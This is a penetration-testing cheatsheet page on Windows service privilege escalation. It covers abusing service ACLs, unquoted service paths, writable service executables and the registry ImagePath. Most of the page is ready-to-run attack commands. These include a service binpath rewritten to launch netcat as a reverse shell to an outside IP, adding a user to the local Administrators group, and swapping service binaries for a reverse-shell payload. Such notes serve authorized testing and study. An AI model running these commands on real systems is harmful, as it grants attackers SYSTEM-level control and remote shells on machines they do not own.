# Service Privilege Escalation

### [Service Privilege Escalation](https://github.com/iptracej/MyPentestCheatsheet/blob/main/PrivEsc/Windows.md#service-privilege-escalation) <a href="#user-content-service-privilege-escalation" id="user-content-service-privilege-escalation"></a>

Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g. SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS). Some may be useful (e.g. SERVICE\_STOP, SERVICE\_START). Some are dangerous (e.g. SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS)

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

#### [Rewrite Service BinPath](https://github.com/iptracej/MyPentestCheatsheet/blob/main/PrivEsc/Windows.md#rewrite-service-binpath) <a href="#user-content-rewrite-service-binpath" id="user-content-rewrite-service-binpath"></a>

{% code overflow="wrap" %}
```bash
#Check the permissions on any Service, given to BOB

accesschk.exe /accepteula –uwcqv yourusername servicename 
accesschk.exe /accepteula -uwcqv IWAM_BOB *    

# -u: Suppress errors
# -w: Show only objects that have write access
# -c: Name is a Windows Service, e.g. ssdpsrv. Specify "*" as the name to show all services and "scmanager" to check the security of the Service Control Manager.
# -q: Omit Banner
# -v: Verbose (includes Windows Vista Integrity Level) 

# Check Service configuration
sc qc SSDPSRV

# Check Service status
sc query SSDPSRV
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Spooler example</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Wauaserv example</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
# Example

#Check the permissions given to a particular service
acesschk.exe -ucqv  /accepteula SSDPSRV

#if you see R+W permission to the user, change the bin path and restart the service
sc config SSDPSRV binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.128 1235 -e cmd.exe"
sc stop  SSDPSRV
sc start SSDPSRV

#if you see the error on retart the service, run the following:
sc config SSDPSRV obj= ".\LocalSystem" password= ""   
sc config SSDPSRV start= "demand"

#Check the SSDPSRV service configuration
sc qc SSDPSRV

#Add IWAM_BOB account to the Local Administrator Group to see the Administrator's directory and files.
net localgroup Administrators IWAM_BOB /add

#Restart the Services (Attack)
sc stop  SSDPSRV
net start SSDPSRV
```
{% endcode %}

#### [Rewrite Unquoted Service Path](https://github.com/iptracej/MyPentestCheatsheet/blob/main/PrivEsc/Windows.md#rewrite-unquoted-service-path) <a href="#user-content-rewrite-unquoted-service-path" id="user-content-rewrite-unquoted-service-path"></a>

When a Service has an unquoted path that also contains spaces under the Service Path such as 'Common Files' in C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe, you can create a Common.exe and rewrite the Service path as C:\Program Files\Unquoted Path Service\Common.exe

{% code overflow="wrap" %}
```bash
# Enumeration
.\winPEASany.exe quiet servicesinfo

wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

#Check the permission for a particular user 
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# Copy the Service to the directory
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

#Restart the Service (Attack)
sc stop  SSDPSRV
net start SSDPSRV
```
{% endcode %}

#### [Insecure Service Executables](https://github.com/iptracej/MyPentestCheatsheet/blob/main/PrivEsc/Windows.md#insecure-service-executables) <a href="#user-content-insecure-service-executables" id="user-content-insecure-service-executables"></a>

If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.

{% code overflow="wrap" %}
```bash
# Enumeration

.\winPEASany.exe quiet servicesinfo

# Check permissions, given to the directory 
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Check permissions, given to the service
.\accesschk.exe /accepteula -uvqc filepermsvc

# Replace the executable
copy "C:\Program Files\File Permissions Service\filepermservice.exe" "C:\temp\"
copy "C:\PrivEsc\reverse.exe" "C:\Program Files\File Permissions Service\filepermservice.exe" 

# Restart the Service (Attack)
sc stop  SSDPSRV
net start filepermsvc
```
{% endcode %}

#### [Change ImagePath in Registry](https://github.com/iptracej/MyPentestCheatsheet/blob/main/PrivEsc/Windows.md#change-imagepath-in-registry) <a href="#user-content-change-imagepath-in-registry" id="user-content-change-imagepath-in-registry"></a>

{% code overflow="wrap" %}
```bash
# Enumeration

.\winPEASany.exe quiet servicesinfo
# Check permissions, given to the registry entry. Look for a user with full control

powrshell
PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc 

#Check the ImagePath
reg query HKLM\System\CurrentControlSet\Services\regsv

#Check the permission for users (privilege to start and stop service)
.\accesschk.exe /accepteula -ucqv user regsvc

# Update the registry
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# Restart the Service (Attack)
sc stop  SSDPSRV
net start regsvc
```
{% endcode %}
